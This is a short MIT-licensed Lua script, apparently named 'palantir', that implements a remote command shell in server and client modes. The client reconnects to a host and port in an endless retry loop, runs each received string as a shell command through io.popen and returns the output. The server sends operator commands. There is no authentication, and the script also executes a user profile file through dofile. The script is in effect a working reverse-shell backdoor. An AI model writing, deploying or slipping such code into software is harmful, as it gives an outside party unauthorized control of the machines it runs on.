-- Copyright (c) 2016 Christian Uhsat <christian@uhsat.de>
-- Permission is hereby granted, free of charge, to any person obtaining a
-- copy of this software and associated documentation files (the "Software"),
-- to deal in the Software without restriction, including without limitation
-- the rights to use, copy, modify, merge, publish, distribute, sublicense,
-- and/or sell copies of the Software, and to permit persons to whom the
-- Software is furnished to do so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in
-- all copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
-- THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
-- FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
-- DEALINGS IN THE SOFTWARE.
local IDLE = 5000

-- call profile
pcall((function()
  dofile(os.getenv("HOME") .. "/.palantirrc")
end))

-- server side
function server(host, port)
  if pcall(function() listen(host, port) end) then
    while true do
      if pcall(function() accept() end) then
        io.write(recv() .. ": ")
        send(io.read())
        io.write(recv())
      end
    end
  end
end

-- client side
function client(host, port)
  while true do
    if pcall(function() connect(host, port) end) then
      pcall(function()
        send(path()); -- add ip:port
        local handle = io.popen(recv())
        local result = handle:read("*a")
        handle:close()
        send(result)
      end)
    else
      sleep(IDLE)
    end
  end
end

-- main stub
if pcall(function() (DAEMON and server or client)(HOST, PORT) end) then
  print("exit")
end
